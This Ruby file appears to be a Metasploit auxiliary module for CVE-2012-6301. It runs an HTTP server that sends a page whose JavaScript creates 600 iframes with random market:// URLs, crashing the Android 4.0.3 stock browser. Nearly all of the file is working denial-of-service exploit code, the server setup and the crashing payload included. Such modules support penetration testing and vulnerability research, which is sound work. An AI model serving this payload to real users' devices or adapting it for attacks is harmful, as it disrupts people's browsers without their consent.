##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "Android Stock Browser Iframe DOS",
        'Description'    => %q(
          This module exploits a vulnerability in the native browser that comes with Android 4.0.3.
          If successful, the browser will crash after viewing the webpage.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Jean Pascal Pereira',  # Original exploit discovery
          'Jonathan Waggoner'     # Metasploit module
        ],
        'References'     => [
          [ 'PACKETSTORM', '118539'],
          [ 'CVE', '2012-6301' ]
        ],
        'DisclosureDate' => "Dec 1 2012",
        'Actions'        => [[ 'WebServer' ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction'  => 'WebServer'
      )
    )
  end

  def run
    exploit # start http server
  end

  def setup
    @html = %|
    <html>
    <body>
    <script type="text/javascript">
      for (var i = 0; i < 600; i++)
      {
        var m_frame = document.createElement("iframe");
        m_frame.setAttribute("src", "market://#{Rex::Text.rand_text_alpha(rand(16) + 1)}");
        document.body.appendChild(m_frame);
      }
    </script>
    </body>
    </html>
    |
  end

  def on_request_uri(cli, _request)
    print_status('Sending response')
    send_response(cli, @html)
  end
end
